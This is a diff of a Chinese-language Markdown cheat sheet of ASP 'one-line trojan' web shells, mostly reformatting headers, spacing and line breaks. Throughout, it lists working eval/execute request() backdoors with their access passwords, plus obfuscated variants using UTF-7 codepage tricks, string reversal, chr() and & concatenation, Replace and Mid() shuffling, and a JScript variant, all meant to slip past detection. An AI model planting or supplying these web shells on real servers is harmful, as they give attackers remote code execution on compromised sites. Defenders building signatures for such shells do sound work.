@@ -1,18 +1,25 @@
 
 
-## ASP一句话木马
+# ASP一句话木马
 
 
-#### 标准一句话
+## 标准一句话
 
 ```
 <%eval request("sb")%>
+
 <%execute request("sb")%>
+
 <%Eval(Request(chr(35)))%>   password:#
+
 <%Eval(((Request(chr(35)))))%> 可以有多对括号
+
 <%ExecuteGlobal request("sb")%>
+
 <%eval request.form("#")%>
+
 <%eval request.item("#")%>
+
 <%eval request("chopper")%>
 
 <%execute request("1")%>
@@ -29,20 +36,13 @@
 ```
 
 
-#### 利用utf-7编码
+## 利用utf-7编码
 
 密码是#，解密只需要将+k-去掉即可，这里的k可以是任意字符，长度也是随意。
 
 ```
 <%@codepage=65000%>
 <%r+k-es+k-p+k-on+k-se.co+k-d+k-e+k-p+k-age=936:e+k-v+k-a+k-l r+k-e+k-q+k-u+k-e+k-s+k-t("#")%>
-```
-
-密码是：c
-
-``` 
-<%@codepage=65000%>
-<%e+x-v+x-a+x-l(+x-r+x-e+x-q+x-u+x-e+x-s+x-t+x-(+x-+ACI-c+ACI)+x-)+x-%>  
 ```
 
 解密后
@@ -52,17 +52,27 @@
 <%response.codepage=936:eval request("#")%>
 ```
 
-#### 字符串逆序
+密码是：c
+
+``` 
+<%@codepage=65000%>
+<%e+x-v+x-a+x-l(+x-r+x-e+x-q+x-u+x-e+x-s+x-t+x-(+x-+ACI-c+ACI)+x-)+x-%>  
+```
+
+
+
+## 字符串逆序
 
 
 StrReverse Replace加密，解密后为：Execute eval request("cmd")
 
 ```
 <%
+
 Function decode(Code)
-	decode=Replace(StrReverse(Code),"/*/","""") '函数名作为变量，表示要返回的数据。而且"""""，表示只有一个双引号（"""），只能用""""，其他都会报错。
+	decode=Replace(StrReverse(Code),"/*/","""") 
 End Function
-Execute decode(")/*/dmc/*/(tseuqer lave")  'eval request(/*/cmd/*/)
+Execute decode(")/*/dmc/*/(tseuqer lave")
 %> A
 ```
 
@@ -72,20 +82,20 @@ ASP自带逆序函数
 <%execute(strreverse(")""xx""(tseuqer lave"))%>
 ```
 
-#### 利用chr ，request
+## 利用chr ，request
 
 ```
 <%eval (eval(chr(114)+chr(101)+chr(113)+chr(117)+chr(101)+chr(115)+chr(116))("1"))%>
 ```
 
 
-#### 利用asp的&连接符
+## 利用asp的&连接符
 
 ```
 <% eval""&("e"&"v"&"a"&"l"&"("&"r"&"e"&"q"&"u"&"e"&"s"&"t"&"("&"0"&"-"&"2"&"-"&"5"&")"&")") %>
 ```
 
-#### 拆分法
+## 拆分
 
 ```
 <% 
@@ -115,7 +125,7 @@ end if
 %> 
 ```
 
-#### 字符串替换(replace函数) 
+## 字符串替换(replace函数) 
 
 ```
 <% 
@@ -126,29 +136,33 @@ eval xxx
 ```
 
 
-#### chr()连接字符串
+## chr()连接字符串
 
 ```
 <%eval(eval(chr(114)+chr(101)+chr(113)+chr(117)+chr(101)+chr(115)+chr(116))("sz"))%>
 ```
 
-#### Mid()连接字符串
+## Mid()连接字符串
 
 基本思路：乱序一个字符串然后反复Mid取字符构成一句话。 
 
 ```
 <% 
-Function d(s):d=Mid(love,s,1):End Function:love="(tqxuesrav l)"&"""":execute(d(6)&d(10)&d(9)&d(12)&d(11)&d(8)&d(6)&d(3)&d(5)&d(6)&d(7)&d(2)&d(1)&d(14)&d(4)&d(4)&d(14)&d(13)) 
+Function d(s)
+    d=Mid(love,s,1)
+End Function
+love="(tqxuesrav l)"&""""
+execute(d(6)&d(10)&d(9)&d(12)&d(11)&d(8)&d(6)&d(3)&d(5)&d(6)&d(7)&d(2)&d(1)&d(14)&d(4)&d(4)&d(14)&d(13)) 
 %>
 ```
 
-#### 字符连接成字符串 
+## 字符连接成字符串 
 
 ```
 <%eval("e"&"v"&"a"&"l"&"("&"r"&"e"&"q"&"u"&"e"&"s"&"t"&"("&"0″&"-"&"2″&"-"&"5″&")"&")")%>   密码-7  
 ```
 
-#### Jscript
+## Jscript
 
 ```
 < %@ Page Language = Jscript %>
